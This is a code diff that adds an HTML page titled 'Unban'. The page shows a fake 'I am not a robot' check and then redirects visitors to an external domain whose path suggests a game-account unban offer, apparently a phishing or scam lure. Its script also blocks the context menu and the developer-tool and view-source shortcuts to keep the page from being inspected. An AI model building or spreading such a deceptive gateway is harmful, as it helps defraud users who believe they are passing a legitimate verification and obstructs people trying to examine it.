@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Unban</title>
+  <style>
+    body {
+      background: linear-gradient(135deg, #667eea, #764ba2);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      user-select: none;
+      margin: 0;
+      overflow: hidden;
+    }
+    .container {
+      background: rgba(255, 255, 255, 0.1);
+      padding: 40px;
+      border-radius: 15px;
+      box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      text-align: center;
+      animation: fadeIn 1.2s ease-in-out;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.9); }
+      to { opacity: 1; transform: scale(1); }
+    }
+    .checkbox {
+      width: 25px;
+      height: 25px;
+      cursor: pointer;
+      transform: scale(1.2);
+    }
+    .verify-btn {
+      margin-top: 20px;
+      padding: 12px 30px;
+      font-size: 16px;
+      font-weight: bold;
+      background: linear-gradient(135deg, #43e97b, #38f9d7);
+      color: white;
+      border: none;
+      border-radius: 30px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+    }
+    .verify-btn:hover {
+      transform: scale(1.05);
+      box-shadow: 0 6px 25px rgba(0, 0, 0, 0.3);
+    }
+    .verify-btn.invalid {
+      animation: vibrate 0.3s linear;
+      background: #ff4d4d;
+    }
+    @keyframes vibrate {
+      0% { transform: translateX(0); }
+      25% { transform: translateX(-5px); }
+      50% { transform: translateX(5px); }
+      75% { transform: translateX(-5px); }
+      100% { transform: translateX(0); }
+    }
+    .verify-btn.valid {
+      animation: successZoom 0.4s ease;
+    }
+    @keyframes successZoom {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.2); }
+      100% { transform: scale(1); }
+    }
+    label span {
+      font-size: 20px;
+      color: #ffffff;
+      margin-left: 10px;
+      vertical-align: middle;
+    }
+  </style>
+  <script>
+    let mouseMoved = false;
+
+    document.addEventListener("mousemove", () => {
+      mouseMoved = true;
+    });
+
+    document.addEventListener("touchmove", () => {
+      mouseMoved = true;
+    });
+
+    function verifyHuman() {
+      const checkbox = document.getElementById("humanCheck");
+      const btn = document.querySelector(".verify-btn");
+
+      if (checkbox.checked && mouseMoved) {
+        btn.classList.remove("invalid");
+        btn.classList.add("valid");
+        setTimeout(() => {
+          window.location.href = "https://unbanpanel.sbs/ff_i_d_unban/max";
+        }, 400);
+      } else {
+        btn.classList.remove("valid");
+        btn.classList.add("invalid");
+      }
+    }
+
+    // Disable inspect
+    document.addEventListener("contextmenu", e => e.preventDefault());
+    document.onkeydown = function(e) {
+      if (
+        e.keyCode === 123 || // F12
+        (e.ctrlKey && e.shiftKey && e.keyCode === 73) || // Ctrl+Shift+I
+        (e.ctrlKey && e.shiftKey && e.keyCode === 74) || // Ctrl+Shift+J
+        (e.ctrlKey && e.keyCode === 85) // Ctrl+U
+      ) {
+        return false;
+      }
+    };
+  </script>
+</head>
+<body>
+  <div class="container">
+    <label>
+      <input type="checkbox" id="humanCheck" class="checkbox" />
+      <span>I am not a robot</span>
+    </label>
+    <br />
+    <button class="verify-btn" onclick="verifyHuman()">Verify</button>
+  </div>
+</body>
+</html>
